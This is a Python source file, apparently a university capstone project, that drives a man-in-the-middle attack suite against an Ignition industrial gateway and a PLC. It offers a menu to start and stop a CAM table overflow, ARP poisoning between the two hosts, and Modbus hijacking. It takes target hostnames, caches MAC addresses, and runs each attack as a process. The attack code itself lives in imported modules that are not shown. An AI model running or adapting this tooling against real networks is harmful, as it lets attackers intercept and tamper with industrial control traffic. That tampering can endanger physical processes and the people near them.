#!/usr/bin/env python3
"""
file:       final-exploit.py
author:     Chris Tremblay <cst1465@rit.edu>
date:       03/08/2023
language:   Python3
version:    v1.0
description:
    A suite of applications to perform an MITM attack on Ignition
"""
# imports 
import sys 
import argparse
import os
import multiprocessing as mp
import signal
import traceback

# the exploit libaries
import final_exploit
from color_prefixes import * # for terminal colors
import cam_overflow
import arp_spoof
import modbus_hijack

# command line args
HOSTNAME_IGNITION   = None
HOSTNAME_PLC        = None
SWITCH_MEM_SIZE     = None
DST_IP              = None
SRC_IP              = None
IFACE               = None

PLC_MAC = None
IGNITION_MAC = None
PLC_IP = None
IGNITION_IP = None

# parser strings
PARSE_DESC = "Ignition MITM Attack Suite. Capstone Project Spring 2023."
PARSE_EPIL = "Author: Chris Tremblay <cst1465@rit.edu>"

# Menu strings
MENU_STR_CAM_OVERFLOW   = "%d) CAM Overflow Attack (%s)"
MENU_STR_ARP_POISON     = "%d) ARP Poisining Attack (%s)"
MENU_STR_MODBUS_HIJACK  = "%d) Modbus Hijacking Attack (%s)"
MENU_STR_QUIT           = "%d) Quit"
MENU_ITEMS              = None # populated later
MENU_DICT               = None # populated later
MENU_RUNNING            = "Running"
MENU_NOT_RUNNING        = "Not Running"
MENU_CAM_OVERFLOW       = 0
MENU_ARP_POISON         = 1
MENU_MODBUS_HIJACK      = 2
MENU_QUIT               = 3
SELECTION_STRING        = "Enter Selection: "

PROCESS_DICT            = dict()

# ANSI code to switch to alternate screen
ALTERNATE_SCREEN = "\u001B[?1049h"

# ANSI code to switch back to original screen
ORIGINAL_SCREEN = "\u001B[?1049l"

def to_alternate_screen():
        """
        Description:
                Switch to an alternate screen
        """
        sys.stdout.write( ALTERNATE_SCREEN )
        sys.stdout.flush()

def to_original_screen():
        """
        Description:
                Go back to main screen
        """
        sys.stdout.write( ORIGINAL_SCREEN )
        sys.stdout.flush()

def get_menu_str_items() -> list:
    """
    description:
        pull variables with prefix MENU_STR to generate list
    returns:
        the list of menu_str items
    """
    l = [ vars( final_exploit ).get(x) for x in vars( final_exploit ) \
            if( type(vars(final_exploit).get(x))==str and ( x!="__name__") \
            and ('MENU_STR' in x )) ]
    return l

def populate_menu_items():
    """
    description:
        generate menu item list and dict
    """
    # define global vars
    global MENU_ITEMS
    global MENU_DICT
    MENU_ITEMS = list()
    MENU_DICT = dict()

    # create list of menu items
    strings = get_menu_str_items()
    for string in strings:
        MENU_ITEMS.append( string )
        MENU_DICT[string] = False
    return

def parse_cli():
    """
    description:
        parse commandline args
    """
    # init parser
    parser = argparse.ArgumentParser( description=PARSE_DESC,\
                epilog=PARSE_EPIL )
    parser.add_argument( "-i", "--ignition-hostname", type=str, \
            dest = "ignition_hostname",\
            help="Hostname of Ignition Gateway server")
    parser.add_argument( "-p", "--plc-hostname", type=str, \
            dest="plc_hostname", \
            help="Hostname of PLC" )
    parser.add_argument( "-M", "--switch-mem", type=int,\
            dest="switch_mem",\
            help="Size of switch CAM in Kilobytes, for CAM Overflow attack. Just tells you when CAM Table is probably overflowed" )
    parser.add_argument( "-d", "--dst-ip", type=str, \
            dest="co_dst_ip", \
            help="Destination IP Address Field for ARP packet in CAM Overflow attack" )
    parser.add_argument( "-s", "--src-ip", type=str, \
            dest="co_src_ip", \
            help="Source IP Address Field for ARP packet in CAM Overflow attack")
    parser.add_argument( 'iface', choices=os.listdir('/sys/class/net'), \
            help="Network interface to use for sniffing" )

    # parse args
    args = parser.parse_args( sys.argv[1:] )
    
    # populate args
     # global variables
    global HOSTNAME_IGNITION
    global HOSTNAME_PLC
    global SWITCH_MEM_SIZE
    global DST_IP
    global SRC_IP
    global IFACE

    HOSTNAME_IGNITION   = args.ignition_hostname
    HOSTNAME_PLC        = args.plc_hostname
    SWITCH_MEM_SIZE     = args.switch_mem
    DST_IP              = args.co_dst_ip
    SRC_IP              = args.co_src_ip
    IFACE               = args.iface
    return

def get_menu_selection() -> int:
    """
    description:
        display menu and get user selection
    returns:
        the selected item, None upon failure
    """
    looping = True
    error = False
    error_str = ""
    while( looping ):
        # print menu
        print()
        for i in range( 0, len( MENU_ITEMS ) ):
            running = MENU_ITEMS[i] in PROCESS_DICT.keys()
            if( running ):
                running = GREEN_PREFIX + MENU_RUNNING + GREEN_SUFFIX
            else:
                running = RED_PREFIX + MENU_NOT_RUNNING + RED_SUFFIX
            try:
                print( MENU_ITEMS[i] % (i+1, running) )
            except:
                print( MENU_ITEMS[i] % (i+1) )
        if( error ):
            print( RED_PREFIX + error_str + RED_SUFFIX )
            error = False

        # user input
        try:
            inp = input( SELECTION_STRING )
        except KeyboardInterrupt:
            return None
        finally:
            selection = None

        # error checking
        try:
            if( not inp ):
                continue 
            if( inp.lower()[0] == 'q' ):
                return MENU_QUIT 

            selection = int( inp )
            # selection is in bounds
            if( 0 < selection and selection <= len( MENU_ITEMS ) ):
                looping = False
            else:
                error = True
                error_str = "\tInvalid Selection. Select Number In Bounds."
        except:
            error_str = "\tInvalid Selection. Not a Valid Number." 
            error = True
    return selection-1

def input_yes_no( running: bool, prompt: str = None ) -> bool:
    """
    description:
        get yes no answer 
    params:
        running -> is attack already running?
    returns:
        true -> if user said yes
        false -> if user said no
        None -> upon some failure
    """
    # generate prompt
    if( prompt is None and not running ):
        p = "Start attack? (y/n): "
    elif( prompt is None and running ):
        p = "Stop attack? (y/n): "
    elif( not prompt is None ):
        p = prompt

    # get input
    while( True ):
        inp = ""
        # start or stop attack based on input
        try:
            inp = input( YELLOW_PREFIX + p + YELLOW_SUFFIX )
        except:
            continue
        
        lower = inp.lower()
        # if lowercase input does not contain yes or no, but exists
        if( (len(lower) > 0) and (lower[0] != 'n') and (lower[0] != 'y') ):
            continue
        # user hit enter or yes
        if( (len(lower) == 0) or (lower[0] == 'y') ):
            return True
        # user typed no
        if( lower[0] == 'n' ):
            return False
    return None

def generic_start_stop( attack: str, attack_func: callable, in_args ):
    """
    description:
        start or stop an attck
    parameters:
        attack -> the string that defines the attack
        start_func -> the function that starts the attack
        stop_func -> the function that stops the attack
    returns:
        the process, none upon failure
    """
    # get running status
    running = attack in PROCESS_DICT

    # user input to start/stop attack
    yes = input_yes_no( running )
    if( yes is None ):
        print( RED_PREFIX + "error getting user input" + RED_SUFFIX )
        return

    # if attack is running and user wants to stop it
    p = None
    if( running and yes ):
        try:
            print( YELLOW_PREFIX + "Stopping processes." + \
                YELLOW_SUFFIX )
            PROCESS_DICT[attack].terminate()
            p = PROCESS_DICT.pop( attack )
            print( YELLOW_PREFIX + "Process stopped." + YELLOW_SUFFIX )
        except Exception as e:
            traceback.print_exc()
            print( RED_PREFIX, e, RED_SUFFIX )

    # if attack isn't running and user wants to start it
    if( not running and yes ):
        print( YELLOW_PREFIX + "Starting process." + YELLOW_SUFFIX )
        if( in_args is None ):
            p = mp.Process( target=attack_func )
        else:
            p = mp.Process( target=attack_func, args=in_args )
        PROCESS_DICT[attack] = p
        PROCESS_DICT[attack].start()
        status = None
        if( p.is_alive() ):
            status = "is"
        else:
            status = "isn't"
        print( YELLOW_PREFIX + "Process %d created, and %s running." % \
            (p.pid, status) + YELLOW_SUFFIX )

    if( (running and not yes) or (not running and not yes) ):
        print( YELLOW_PREFIX + "Cancelled." + YELLOW_SUFFIX )
    return p

def handler_cam_overflow():
    """
    description:
        manage turning on and off CAM overflow attack
    """
    print( YELLOW_PREFIX +  "*** CAM Overflow ***" \
            + YELLOW_SUFFIX )

    # check if we are stopping process, yes this is a smidge clunky
    if( MENU_STR_CAM_OVERFLOW in PROCESS_DICT ):
        generic_start_stop( MENU_STR_CAM_OVERFLOW, None, None )
        return

    # check and see if command line provided something
    # TODO

    # if no command line ask user for parameters
    dst_ip = None
    src_ip = None
    mem_size = None
    try:
        # messaging
        print( YELLOW_PREFIX + "Enter information src and dst fields in ARP packet, optionally CAM table size." + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "Defaults:" + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "\tdst_ip: %s" % (cam_overflow.DST_IP) + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "\tsrc_ip: %s" % (cam_overflow.SRC_IP) + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "\tcam table size: None" + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "Enter parameters or press Ctrl-C to proceed with defaults" + YELLOW_SUFFIX )
        
        # get dest ip
        global DST_IP
        if( not DST_IP is None ):
            dst_ip = input( YELLOW_PREFIX + "Use %s as dst_ip? (Press Enter for yes, or type a new one): " % (DST_IP) + YELLOW_SUFFIX )
            if( len(dst_ip) == 0 ):
                dst_ip = DST_IP
        else:
            dst_ip = input( YELLOW_PREFIX + "dst_ip: " + YELLOW_SUFFIX )

        # get source ip
        global SRC_IP
        if( not SRC_IP is None ):
            src_ip = input( YELLOW_PREFIX + "Use %s as src_ip? (Press Enter for yes, or type a new one): " % (SRC_IP) + YELLOW_SUFFIX )
            if( len(src_ip) == 0 ):
                src_ip = SRC_IP
        else:
            src_ip = input( YELLOW_PREFIX + "src_ip: " + YELLOW_SUFFIX )

        # get mem size
        global SWITCH_MEM_SIZE
        if( not SWITCH_MEM_SIZE is None ):
            mem_size = input( YELLOW_PREFIX + "Use %d as mem_size? (Press Enter for yes, or type a new one): " % (SWITCH_MEM_SIZE) + YELLOW_SUFFIX )
            if( len(mem_size) == 0 ):
                mem_size = SWITCH_MEM_SIZE
        else:
            mem_size = input( YELLOW_PREFIX + "CAM size (Press Enter to skip): " + YELLOW_SUFFIX )

            # proess memsize before proceeding
            if( len(mem_size) == 0 ):
                mem_size = None
            else:
                try:
                    mem_size = int( mem_size )
                except ValueError:
                    print( RED_PREFIX + "Invalid number. Proceeding with default" + RED_SUFFIX )
                    mem_size = None
    except KeyboardInterrupt:
        print( YELLOW_PREFIX + "\nProceeding with defaults" + YELLOW_SUFFIX )
        dst_ip = cam_overflow.DST_IP
        src_ip = cam_overflow.SRC_IP
        mem_size = None
    except Exception as e:
        print( RED_PREFIX + "\n" + str(e) + ". Proceeding with defaults" + RED_SUFFIX )
        dst_ip = cam_overflow.DST_IP
        src_ip = cam_overflow.SRC_IP
        mem_size = None
    finally: 
        generic_start_stop( \
            MENU_STR_CAM_OVERFLOW, \
            cam_overflow.cam_overflow, \
            (dst_ip, src_ip, mem_size ) \
        )
    return

def handler_arp_poisoning():
    """
    description:
        manage turning on and off arp poisoning attack
    """
    global PLC_MAC
    global PLC_IP
    global IGNITION_IP
    global IGNITION_MAC

    print( YELLOW_PREFIX + "*** ARP Poisoning ***" \
            + YELLOW_SUFFIX )
    if( MENU_STR_ARP_POISON in PROCESS_DICT ):
        p = generic_start_stop(\
            MENU_STR_ARP_POISON,\
            arp_spoof.arp_poison,\
            None \
        ) 
        try:
            p.kill()
        except Exception as e:
            print( RED_PREFIX + str(e) + RED_SUFFIX )  
        return

    plc_hostname = None
    ignition_hostname = None
    try:
        print( YELLOW_PREFIX + "Enter Information for IP Addresses" + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "Defaults:" + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "\tIgnition Hostname: %s" % (arp_spoof.GATEWAY) + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "\tPLC Hostname: %s" % (arp_spoof.PLC) + YELLOW_SUFFIX )
        print( YELLOW_PREFIX + "Enter parameters or press Ctrl-C to proceed with above defaults" + YELLOW_SUFFIX )
        global HOSTNAME_IGNITION
        if( not HOSTNAME_IGNITION is None ):
            ignition_hostname = input( YELLOW_PREFIX + "Use %s as Ignition Hostname? (Press Enter for yes, or type a new one): " % (HOSTNAME_IGNITION) + YELLOW_SUFFIX )
            if( len(ignition_hostname) == 0 ):
                ignition_hostname = HOSTNAME_IGNITION
        else:
            ignition_hostname = input( YELLOW_PREFIX + "Ignition Hostname: " + YELLOW_SUFFIX )

        global HOSTNAME_PLC
        if( not HOSTNAME_PLC is None ):
            plc_hostname = input( YELLOW_PREFIX + "Use %s as PLC Hostname? (Press Enter for yes, or type a new one): " % (HOSTNAME_PLC) + YELLOW_SUFFIX ) 
            if( len(plc_hostname) == 0 ):
                plc_hostname = HOSTNAME_PLC 
        else:
            plc_hostname = input( YELLOW_PREFIX + "PLC Hostname: " + YELLOW_SUFFIX )

    except KeyboardInterrupt:
        print( YELLOW_PREFIX + "\nProceeding with defaults" + YELLOW_SUFFIX )
        ignition_hostname = arp_spoof.GATEWAY
        plc_hostname = arp_spoof.PLC
    except Exception as e:
        print( RED_PREFIX + "\n" + str(e) + ". Proceeding with defaults" + RED_SUFFIX )
        ignition_hostname = arp_spoof.GATEWAY
        plc_hostname = arp_spoof.PLC
    finally:
        print( YELLOW_PREFIX + "Caching MAC address for %s" % ignition_hostname + YELLOW_SUFFIX )
        IGNITION_MAC = arp_spoof.get_mac( ignition_hostname, piface=IFACE )
        IGNITION_IP = ignition_hostname
        print( YELLOW_PREFIX + "Caching MAC address for %s" % plc_hostname + YELLOW_SUFFIX)
        PLC_MAC = arp_spoof.get_mac( plc_hostname, piface=IFACE )
        PLC_IP = plc_hostname
        p = generic_start_stop(\
                MENU_STR_ARP_POISON,\
                arp_spoof.arp_poison,\
                (plc_hostname, ignition_hostname, IFACE) \
        )    
    return

def handler_modbus_hijack():
    """
    description:
        manage turning on and off modbus hijacking attack
    """
    print( YELLOW_PREFIX + "*** Modbus Hijack ***"\
            + YELLOW_SUFFIX )

    # check if arp poisoning and cam overflow are running
    if( not MENU_STR_MODBUS_HIJACK in PROCESS_DICT and not MENU_STR_ARP_POISON in PROCESS_DICT ):
        print( RED_PREFIX + "ARP Poisoning not running." + RED_SUFFIX )
        proceed = input_yes_no( False, prompt="Proceed Anyways? (y/n): " )
        if( proceed is None ):
            print( RED_PREFIX + "An error occurred" + RED_SUFFIX )
            return 
        if( not proceed ):
            print( YELLOW_PREFIX + "Cancelling" + YELLOW_SUFFIX )
            return

    # start attack
    generic_start_stop(\
            MENU_STR_MODBUS_HIJACK,\
            modbus_hijack.modbus_hijack,\
            (PLC_IP, PLC_MAC, IGNITION_IP, IGNITION_MAC, IFACE)\
    )    
    return

def handler_quit():
    """
    description:
        stop all processes and exit cleanly
    """
    for attack in PROCESS_DICT:
        try:
            p = PROCESS_DICT[attack]
            print( YELLOW_PREFIX + "Stopping Process %d" % (p.pid) + YELLOW_SUFFIX )
            p.terminate()
            print( YELLOW_PREFIX + "Process Stopped" + YELLOW_SUFFIX ) 
        except Exception as e:
            print( RED_PREFIX + str(e) + RED_SUFFIX  )
    return

def main():
    """
    description:
        the driver function
    """
    looping = True
    while( looping ):
        selection = get_menu_selection()
        if( selection is None ):
            continue

        # handle selection
        if( selection == MENU_CAM_OVERFLOW ):
            handler_cam_overflow()
        elif( selection == MENU_ARP_POISON ):
            handler_arp_poisoning()
        elif( selection == MENU_MODBUS_HIJACK ):
            handler_modbus_hijack()
        elif( selection == MENU_QUIT ):
            handler_quit()
            looping = False
    return

if( __name__ == "__main__" ):
    parse_cli()
    populate_menu_items()
    signal.signal( signal.SIGCHLD, signal.SIG_IGN )
    #to_alternate_screen()
    main()
    #to_original_screen()
